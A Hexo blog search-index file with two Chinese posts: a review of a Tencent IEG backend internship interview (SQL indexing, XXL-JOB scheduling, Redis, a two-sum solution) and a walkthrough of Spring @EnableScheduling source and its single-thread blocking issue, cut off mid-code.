<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>腾讯 IEG 游戏前沿技术 一面复盘</title>
      <link href="/2024/09/18/%E8%85%BE%E8%AE%AF%20IEG%20%E6%B8%B8%E6%88%8F%E5%89%8D%E6%B2%BF%E6%8A%80%E6%9C%AF%20%E4%B8%80%E9%9D%A2%E5%A4%8D%E7%9B%98/"/>
      <url>/2024/09/18/%E8%85%BE%E8%AE%AF%20IEG%20%E6%B8%B8%E6%88%8F%E5%89%8D%E6%B2%BF%E6%8A%80%E6%9C%AF%20%E4%B8%80%E9%9D%A2%E5%A4%8D%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>投了个实习内推后台开发，本来要电话先交流的那天直接走流程下午面试了，对面两人，面了有一个小时，游戏本的构思续航忘记插电了最后还掉线了一下，趁着还记得面试内容复盘一下</p><h1 id="自我介绍一下"><a href="#自我介绍一下" class="headerlink" title="自我介绍一下"></a>自我介绍一下</h1><p>答：</p><p>您好，我是深大26届 xxx 的 xxx，对贵公司后台开发的岗位很感兴趣。现在在 xxx 做后台开发实习生，负责项目的开发和运维相关，还有一部分系统设计相关的的工作，之前在学校中也做过 web 开发相关的项目。</p><p>了解到贵公司正在招聘后台开发，做与 AI 相关的交叉。考虑到自己在 xx，对经典机器学习算法还有其相关的论文也比较了解，加上自己在后台开发相关生态的实践较多，因此认为本人跟贵公司的岗位是比较契合的。</p><p>我听学长的介绍了解到贵公司会做分布式训练的内容，这块我也是比较感兴趣的。觉得能够将自己在后台开发中对分布式服务的实践与课程中机器学习的内容还有模型的训练的知识相结合，会是很美妙的事情。</p><p>很荣幸能有今天交流的机会，希望我们沟通愉快</p><h1 id="问实习"><a href="#问实习" class="headerlink" title="问实习"></a>问实习</h1><h2 id="SQL-优化"><a href="#SQL-优化" class="headerlink" title="SQL 优化"></a>SQL 优化</h2><h3 id="问：实习干了什么"><a href="#问：实习干了什么" class="headerlink" title="问：实习干了什么"></a>问：实习干了什么</h3><p>答：会对已有的项目做一些修改，业务需求变动的时候对接口做修改。在开发过程中也出现过因为大数据量导致的性能问题，自己有对 <strong>SQL 优化</strong>慢查询，也有用上数据结构的知识解决问题</p><h3 id="问：具体是怎么做的"><a href="#问：具体是怎么做的" class="headerlink" title="问：具体是怎么做的"></a>问：具体是怎么做的</h3><p>答：SQL 慢查询的话，先用 explain 看查询过程，尽量让它走索引。然后看联表的情况，要让<strong>小表驱动大表</strong>，有过滤条件的话尽量在联表之前先过滤，叫<strong>谓词下推</strong>，然后尽量不要使用 select *，要将联合索引覆盖查询的字段，叫<strong>覆盖索引</strong></p><h3 id="问：可以举实际案例吗"><a href="#问：可以举实际案例吗" class="headerlink" title="问：可以举实际案例吗"></a>问：可以举实际案例吗</h3><p>答：用户表和部门表，一个大一个小的时候，小表放在 LEFT JOIN 的左边</p><h3 id="问：覆盖索引详细讲下"><a href="#问：覆盖索引详细讲下" class="headerlink" title="问：覆盖索引详细讲下"></a>问：<strong>覆盖索引</strong>详细讲下</h3><p>答：先介绍下<strong>聚簇索引</strong>和<strong>非聚簇索引</strong>，我们根据索引构建的树查找数据，最后叶子节点包含全部数据就是聚簇索引，不是则是非聚簇索引。MySQL 默认存储引擎和 Innodb 他们分别是其中之一。当我们查询的字段不在叶子节点时，就会增加一个回表查询的过程，所以尽量让索引覆盖我们查询的字段。</p><blockquote><p>复盘：MyISAM 是非聚簇索引，Innodb 是聚簇索引。<strong>回表查询</strong>指 非主键索引树搜索回到主键索引树搜索的过程</p></blockquote><h3 id="问：覆盖索引是覆盖-select-后面的还是覆盖-where-后面的"><a href="#问：覆盖索引是覆盖-select-后面的还是覆盖-where-后面的" class="headerlink" title="问：覆盖索引是覆盖 select 后面的还是覆盖 where 后面的"></a>问：覆盖索引是覆盖 select 后面的还是覆盖 where 后面的</h3><p>答：是覆盖 select 后面的（完了，好像都要）</p><p>然后就被解释了一下也要覆盖 where 后面的</p><blockquote><p>拓展：可以深挖 SQL 优化的其他方法，包括<strong>分页、分组、排序</strong>等。以及<strong>生产环境建索引</strong>的问题</p><p>SQL 优化的方式有很多种，大体分为 <strong>物理查询优化</strong> 和 <strong>逻辑查询优化</strong> 两种，前者利用 <strong>索引</strong> 和 <strong>表连接方式</strong> 等技术进行优化，后者利用 <strong>等价变换</strong> 提升查询效率</p><p>最左前缀法则使select、where、order by走索引，谓词下推，小表驱动大表，覆盖索引。</p><p>深度分页时，有两种解决方案，一种是当索引是自增时，根据索引先定位到数据行，一种是先对索引做分页查询再回表。</p><p>如果有需要创建索引的情况，需要考虑生产环境下建索引可能导致长时间锁表，期间有数据更新插入导致的数据不一致，可以通过建新表建索引批量导入再批量执行期间更新插入的数据解决。</p></blockquote><h2 id="分布式定时任务"><a href="#分布式定时任务" class="headerlink" title="分布式定时任务"></a>分布式定时任务</h2><h3 id="问：讲一下这个分布式的定时任务"><a href="#问：讲一下这个分布式的定时任务" class="headerlink" title="问：讲一下这个分布式的定时任务"></a>问：讲一下这个分布式的定时任务</h3><p>答：一开始这边是有每天查数据库然后根据表的数据发送短信通知的定时任务的需求，可以启动一个单体的 Springboot 项目去执行。但是后面有各种其他的定时任务，比如备份数据库的需求，定期刷新 redis 缓存等，我们发现单体的定时任务不容易监控它的运行结果，也不容易做统一的管理，在运行失败时及时定位错误</p><p>所以就采用 XXL-JOB 这个开源项目作为我们的分布式定时任务的解决方案，我也在三台服务器上搭建了 XXL-JOB-ADMIN 定时任务调度中心的集群，目前已经投入生产</p><h3 id="问：为什么要用分布式"><a href="#问：为什么要用分布式" class="headerlink" title="问：为什么要用分布式"></a>问：为什么要用分布式</h3><p>答：单体的多种定时任务不容易做统一的管理，不能及时地定位错误</p><blockquote><p>复盘：<br>参考文章： <a href="https://zhuanlan.zhihu.com/p/660320770">https://zhuanlan.zhihu.com/p/660320770</a></p><p>主要有以下原因</p><p>高可用：单体的定时任务只在一台机器运行，当程序或节点挂掉时就会导致功能不可用，对于一些核心功能来说是无法接受的</p><p>性能瓶颈：单台机器的CPU、磁盘还有内存有限，任务量过大时会处理不过来</p><p>分布式的解决方案就能实现高可用，将任务数据持久化到数据库，有完善的任务重做功能和告警机制</p></blockquote><h3 id="问：有任务执行太慢导致后面的任务延期执行怎么办"><a href="#问：有任务执行太慢导致后面的任务延期执行怎么办" class="headerlink" title="问：有任务执行太慢导致后面的任务延期执行怎么办"></a>问：有任务执行太慢导致后面的任务延期执行怎么办</h3><p>答：（没答上，实在不应该，之前看过相关文章的）</p><blockquote><p>复盘：参考文章：<a href="https://juejin.cn/post/7414424759228022822">@EnableScheduling 和 @Scheduled 实现定时任务的任务延期问题)</a></p><p>问题的根本在于只使用单个线程去执行定时任务，造成线程的阻塞</p><p>可以手动进行异步编排，交给某个自己配置的线程池执行。</p><p>Springboot 自带的定时任务 @EnableScheduling 会自动创建一个 corePoolSize 为 1 ，maxinumPoolSize 为 Integer.MAX_VALUE 的线程池。可通过自定义配置线程池异步执行任务</p><p>XXL-JOB 中使用快慢线程池，默认将一个 一分钟内触发超过 10 次慢执行的任务交给慢线程池</p></blockquote><h3 id="问：如果让你设计一个调度中心，会怎么去做，多个调度中心是怎么共享任务信息的"><a href="#问：如果让你设计一个调度中心，会怎么去做，多个调度中心是怎么共享任务信息的" class="headerlink" title="问：如果让你设计一个调度中心，会怎么去做，多个调度中心是怎么共享任务信息的"></a>问：如果让你设计一个调度中心，会怎么去做，多个调度中心是怎么共享任务信息的</h3><p>答：XXL-JOB 中使用的是建立数据库表，多个调度中心使用同一个数据库。</p><blockquote><p>复盘：</p><p>参考：</p><p>官方文档：<a href="https://www.xuxueli.com/xxl-job/">分布式任务调度平台XXL-JOB (xuxueli.com)</a></p><p>一篇讲的很好的技术博客：<a href="https://www.cnblogs.com/zzyang/p/17876807.html">新来个架构师，把Xxl-Job原理讲的炉火纯青 - 三友的java日记 - 博客园 (cnblogs.com)</a></p><p>XXL-JOB 同一个集群的多个调度中心之间是没有直接通信的，需要共享同一个数据库表</p><p>XXL-JOB-ADMIN 调度中心需要提供 RESTful API，包括服务的注册，服务注册的摘除，还有任务结果的回调</p><p>执行器需要提供 RESTful API，包括心跳检测，忙碌检测，启动任务，终止任务，还有查看执行的日志</p><p><strong>路由策略</strong>：</p><p>当一个任务配置的执行器有多个时，调度中心在选择执行器的时候有不同的策略，包括</p><p>第一个/最后一个/轮询/随机/最近最少使用(LFU)/最不经常使用(LCU)/故障转移/忙碌转移/一致性Hash/分片广播</p><p><strong>阻塞处理</strong>：</p><p>处理一个任务的时间比较长的时候，可能导致后续的任务调度阻塞，需要配置阻塞处理策略。包括单机串行（默认）、丢弃后续调度、覆盖之前调度</p><p><strong>失败重试</strong>：</p><p>可以考虑配置重试次数，执行器执行失败时进行重试</p><p>分布式环境下使用分片广播时，如果多个任务之间互不影响，可以考虑使用告警，之后手动执行小段；如果互相影响的话需要利用分布式事务</p><p>拓展：分布式环境下考虑使用<strong>分布式锁</strong>解决重复调度问题，还有<strong>分布式事务</strong>解决任务分片的原子性问题</p><p>XXL-JOB 中使用的是 select for update 的方式实现分布式锁</p><p>根据 CAP 理论进行取舍选择 刚性/柔性 分布式事务</p></blockquote><h3 id="问：任务挂掉了怎么排查"><a href="#问：任务挂掉了怎么排查" class="headerlink" title="问：任务挂掉了怎么排查"></a>问：任务挂掉了怎么排查</h3><p>答：XXL-JOB-ADMIN 图形化的后台管理界面可以看到执行的日志，可以看到任务是怎么挂掉的</p><p>（对面并不满意）</p><blockquote><p>复盘：</p><p>最直接的方式是查看执行器回调给调度中心的执行日志以及返回的执行状态</p><p>XXL-JOB 默认实现了邮件的告警，可以通过配置告警邮件接收告警信息</p><p>还可以通过实现 JobAlarm 的接口自定义告警方式</p></blockquote><h1 id="问项目"><a href="#问项目" class="headerlink" title="问项目"></a>问项目</h1><h2 id="问：视频浓缩"><a href="#问：视频浓缩" class="headerlink" title="问：视频浓缩"></a>问：视频浓缩</h2><p>答：这个项目原来呢有一个 Java 编写的后端，通过轮询数据库的方式检查任务的状态，然后通过接口访问一个 Python  fastapi 编写的后端，通过启动 shell 监听进程，去调用 ffmpeg 还有 cpp 编写的 OCR 程序。</p><p>我跟小组成员探讨后决定对其接口的调用关系做简化，将 Python 部分的代码重写并合并到 Java 当中，利用 javacpp 包实现的 jni 接口调用 ffmpeg，再通过实现 native 方法对 OCR程序做调用。实现了代码风格的统一。</p><p>前面提到在 Java 使用轮询数据库的方式，这种方案对磁盘的 IO 压力会比较大，考虑到我们也没有将任务状态持久化存储的需求，于是决定改用事件驱动的方式，将任务的发布和消费解耦。</p><h2 id="问：项目不像一个系统而是一个小工具，有前端吗"><a href="#问：项目不像一个系统而是一个小工具，有前端吗" class="headerlink" title="问：项目不像一个系统而是一个小工具，有前端吗"></a>问：项目不像一个系统而是一个小工具，有前端吗</h2><p>答：有的，项目有前端也有后端</p><h2 id="问：两套架构是什么样"><a href="#问：两套架构是什么样" class="headerlink" title="问：两套架构是什么样"></a>问：两套架构是什么样</h2><p>答：根据用户的两种不同的需求，分别设计了两种部署方式。</p><p>一种是单体式移动办公部署，在客户有 gpu 的电脑上开箱即用，数据的存储使用本地缓存 h2 内嵌数据库</p><p>一种是分布式服务器单体部署，把 yolo、opencv、ocr 部署在显存服务器上，把前端后端部署在静态服务器和其他普通服务器上，提供可访问的网页端</p><h2 id="问：事件驱动是怎么实现"><a href="#问：事件驱动是怎么实现" class="headerlink" title="问：事件驱动是怎么实现"></a>问：事件驱动是怎么实现</h2><p>答：在单体的架构中，我们选择用 SpringBoot 自带的事件驱动模型；在分布式架构中，我们使用 MQ。</p><h2 id="问：选的是什么-MQ，对比了哪些技术，为什么"><a href="#问：选的是什么-MQ，对比了哪些技术，为什么" class="headerlink" title="问：选的是什么 MQ，对比了哪些技术，为什么"></a>问：选的是什么 MQ，对比了哪些技术，为什么</h2><p>答：选的是 RocketMQ，对比了 RabbitMQ 和 Kafka。</p><p>Kafka 的吞吐量很大，但是可靠性无法保证，RabbitMQ 吞吐量和可靠性都不错，但是我们的团队相对 MQ 做定制化的改进，由于 RabbitMQ 是 Erlang 编写，需要更多的学习成本，而 RocketMQ 是 Java 编写的。</p><p>所以我们基于吞吐量，可靠性，扩展性三个维度的考虑，最后选择了 RocketMQ</p><h2 id="问：为什么说-Kafka-的可靠性无法保证"><a href="#问：为什么说-Kafka-的可靠性无法保证" class="headerlink" title="问：为什么说 Kafka 的可靠性无法保证"></a>问：为什么说 Kafka 的可靠性无法保证</h2><p>答：这一块还需要仔细研究。。</p><blockquote><p>复盘：</p><p>Kafka 的可靠性是有保证的。</p></blockquote><h1 id="问专业技能"><a href="#问专业技能" class="headerlink" title="问专业技能"></a>问专业技能</h1><h2 id="问：docker"><a href="#问：docker" class="headerlink" title="问：docker"></a>问：docker</h2><p>答：在 docker 上的实践不多，有同事遇到 docker 部署 Python 项目的</p><h2 id="问：你做的运维是指把应用部署在服务器上吗"><a href="#问：你做的运维是指把应用部署在服务器上吗" class="headerlink" title="问：你做的运维是指把应用部署在服务器上吗"></a>问：你做的运维是指把应用部署在服务器上吗</h2><p>答：包括把前端的 dist 包部署到静态服务器上，编写脚本运行后端的 jar 包，重定向日志输出。有考虑搭建 k8s 集群，由于需要重启服务器，迁移原有服务等危险的操作，暂时没有执行</p><h2 id="问：那服务挂掉了怎么办"><a href="#问：那服务挂掉了怎么办" class="headerlink" title="问：那服务挂掉了怎么办"></a>问：那服务挂掉了怎么办</h2><p>答：看运行的日志。如果是 k8s 的话可以对 pod 重启，还有在高压期自动扩缩容</p><h2 id="问：redis-有用到是吧"><a href="#问：redis-有用到是吧" class="headerlink" title="问：redis 有用到是吧"></a>问：redis 有用到是吧</h2><p>答：有用到 redis 将访问数据库的大数据量的结果保存在缓存中。</p><p>反问：用的是什么数据结构</p><p>答：（没想起来叫做 string）就是最基本的键值对</p><h2 id="问：说下-redis-其它数据结构"><a href="#问：说下-redis-其它数据结构" class="headerlink" title="问：说下 redis 其它数据结构"></a>问：说下 redis 其它数据结构</h2><p>答：比如 哈希，可以存多个键值对</p><blockquote><p>复盘：</p><p>redis 数据结构：</p><ol><li>string：一个 key 对应一个 value，当 value 为数字时可以用数值操作</li><li>hash：底层使用哈希表存储，一个 key 可以对应多个 field，每个 field 映射到一个 value；典型应用在对象管理</li><li>list：底层使用双向链表，一个 key 可以保存多个数据，并且体现数据进入的顺序</li><li>set：和 hash 结构相同，存储键不存储值，对大数据量高效查询</li><li>sorted_set：在 set 基础上增加排序字段</li></ol></blockquote><h2 id="问：用的是-git-还是-svm"><a href="#问：用的是-git-还是-svm" class="headerlink" title="问：用的是 git 还是 svm"></a>问：用的是 git 还是 svm</h2><p>答：用的是 git，外网用 gitee，内网用 gitlab 私有仓库</p><h2 id="问：有写过前端是吗"><a href="#问：有写过前端是吗" class="headerlink" title="问：有写过前端是吗"></a>问：有写过前端是吗</h2><p>答：是的，在学校有写过 web 前端项目，实习的时候也偶尔写前端</p><h1 id="写算法"><a href="#写算法" class="headerlink" title="写算法"></a>写算法</h1><p>说给我一道简单的题吧，然后就是 两数之和 （？</p><p><a href="https://leetcode.cn/problems/two-sum">1. 两数之和</a></p><p>我就先说用暴力的解法两层循环复杂度O(n^2)可以实现</p><p>对面说那你不要用两层循环，用其他办法</p><p>然后就搓出来运行一下没什么问题</p><p>当时写的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">func</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;  </span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; ++i)</span><br><span class="line">            map.put(nums[i], i);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.get(target - nums[i]) != <span class="literal">null</span>)&#123;  </span><br><span class="line">                List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(); </span><br><span class="line">                result.add(i);</span><br><span class="line">                result.add(map.get(target - nums[i]));</span><br><span class="line">                <span class="keyword">return</span> result;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">          <span class="type">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">11</span>&#125;;</span><br><span class="line">          <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> <span class="number">9</span>;</span><br><span class="line">          System.out.println(func(nums, target));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实标准题解如下，只要一次遍历就行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length;  </span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)&#123;  </span><br><span class="line">            <span class="keyword">if</span> (map.get(target - nums[i]) != <span class="literal">null</span>)&#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;map.get(target - nums[i]), i&#125;;  </span><br><span class="line">            &#125;  </span><br><span class="line">            map.put(nums[i], i);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="问情况"><a href="#问情况" class="headerlink" title="问情况"></a>问情况</h1><p>问：你现在是在 xxx 上班，要是有腾讯的机会会怎么想</p><p>答：会尽快完成工作的交接，把握住眼前有挑战的机会</p><p>问：上课情况</p><p>答：自己的规划是在大三多一些实践的经历，所以有调整课表的情况，课比较少。现在还在选课阶段，可以根据后面实习的情况动态调整选课的情况</p><p>问：所以具体是？</p><p>答：能保证一周到勤 3 ~ 4 天</p>]]></content>
      
      
      <categories>
          
          <category> 面试经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 定时任务 </tag>
            
            <tag> SQL </tag>
            
            <tag> Redis </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EnableScheduling 和 Scheduled 实现定时任务的任务延期问题</title>
      <link href="/2024/09/17/@EnableScheduling%20%E5%92%8C%20@Scheduled%20%E5%AE%9E%E7%8E%B0%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BB%BB%E5%8A%A1%E5%BB%B6%E6%9C%9F%E9%97%AE%E9%A2%98/"/>
      <url>/2024/09/17/@EnableScheduling%20%E5%92%8C%20@Scheduled%20%E5%AE%9E%E7%8E%B0%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%BB%BB%E5%8A%A1%E5%BB%B6%E6%9C%9F%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在复盘 ieg 一面看到定时任务阻塞的问题时，研究了下 @EnableScheduling 的源码，觉得可以单开一篇文章讲一讲</p><p>本文主要讲述了使用 @EnableScheduling 可能出现的线程阻塞导致定时任务延期的问题，也顺便解释了动态定时任务源码上的实现</p><p>引用文章：</p><p>@Schedule定时任务+分布式环境：<a href="https://mp.weixin.qq.com/s/gdMvLeoI7HVbdNubUzbfTw">@Schedule定时任务+分布式环境，这些坑你一定得注意！！！ (qq.com)</a></p><p>java 中的线程池参数：<a href="https://blog.csdn.net/chzphoenix/article/details/78968075">java中四种线程池及poolSize、corePoolSize、maximumPoolSize_maximum-pool-size-CSDN博客</a></p><p>线程池的拒绝策略：<a href="https://blog.csdn.net/jgteng/article/details/54411423">线程池的RejectedExecutionHandler（拒绝策略）-CSDN博客</a></p><p>Java 中实现定时任务：<a href="https://juejin.cn/post/7395043012466835471">Java中实现定时任务，有多少种解决方案？好久没更新博客了，最近上班做了点小东西，总结复盘一下。主要介绍了定时任务的三种 - 掘金 (juejin.cn)</a></p><h1 id="线程阻塞问题"><a href="#线程阻塞问题" class="headerlink" title="线程阻塞问题"></a>线程阻塞问题</h1><h2 id="问题根源"><a href="#问题根源" class="headerlink" title="问题根源"></a>问题根源</h2><p>Java中 使用 Springboot 自带的定时任务 @EnableScheduling 和 @Scheduled 注解，会装配一个 <strong>SchedulingConfiguration</strong> 的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target(ElementType.TYPE)</span>  </span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span>  </span><br><span class="line"><span class="meta">@Import(SchedulingConfiguration.class)</span>  </span><br><span class="line"><span class="meta">@Documented</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> EnableScheduling &#123;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration(proxyBeanMethods = false)</span>  </span><br><span class="line"><span class="meta">@Role(BeanDefinition.ROLE_INFRASTRUCTURE)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SchedulingConfiguration</span> &#123;  </span><br><span class="line">    <span class="meta">@Bean(name = TaskManagementConfigUtils.SCHEDULED_ANNOTATION_PROCESSOR_BEAN_NAME)</span>  </span><br><span class="line">    <span class="meta">@Role(BeanDefinition.ROLE_INFRASTRUCTURE)</span>  </span><br><span class="line">    <span class="keyword">public</span> ScheduledAnnotationBeanPostProcessor <span class="title function_">scheduledAnnotationProcessor</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ScheduledAnnotationBeanPostProcessor</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个配置类又会创建一个 <strong>ScheduledAnnotationBeanPostProcessor</strong> 的 Bean</p><p>在这个类的无参构造中又初始化了一个 <strong>ScheduledTaskRegistrar</strong> 的对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ScheduledAnnotationBeanPostProcessor</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="built_in">this</span>.registrar = <span class="keyword">new</span> <span class="title class_">ScheduledTaskRegistrar</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 创建单例或刷新上下文之后，会执行 <strong>finishRegistration</strong> 方法，最后执行 registrar 的 <strong>afterPropertiesSet</strong> 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterSingletonsInstantiated</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="comment">// Remove resolved singleton classes from cache  </span></span><br><span class="line">    <span class="built_in">this</span>.nonAnnotatedClasses.clear();  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.applicationContext == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="comment">// Not running in an ApplicationContext -&gt; register tasks early...  </span></span><br><span class="line">        finishRegistration();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onApplicationEvent</span><span class="params">(ContextRefreshedEvent event)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (event.getApplicationContext() == <span class="built_in">this</span>.applicationContext) &#123;  </span><br><span class="line">        <span class="comment">// Running in an ApplicationContext -&gt; register tasks this late...  </span></span><br><span class="line">        <span class="comment">// giving other ContextRefreshedEvent listeners a chance to perform  </span></span><br><span class="line">        <span class="comment">// their work at the same time (e.g. Spring Batch&#x27;s job registration).  </span></span><br><span class="line">        finishRegistration();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">finishRegistration</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.scheduler != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="built_in">this</span>.registrar.setScheduler(<span class="built_in">this</span>.scheduler);  </span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">this</span>.registrar.afterPropertiesSet();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ScheduledTaskRegistrar</strong> 的成员变量包括任务的执行器以及几种类型的定时任务列表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Nullable</span>  </span><br><span class="line"><span class="keyword">private</span> TaskScheduler taskScheduler;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Nullable</span>  </span><br><span class="line"><span class="keyword">private</span> ScheduledExecutorService localExecutor;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Nullable</span>  </span><br><span class="line"><span class="keyword">private</span> List&lt;TriggerTask&gt; triggerTasks;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Nullable</span>  </span><br><span class="line"><span class="keyword">private</span> List&lt;CronTask&gt; cronTasks;</span><br></pre></td></tr></table></figure><p><strong>afterPropertiesSet</strong> 方法会获取一个执行器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td 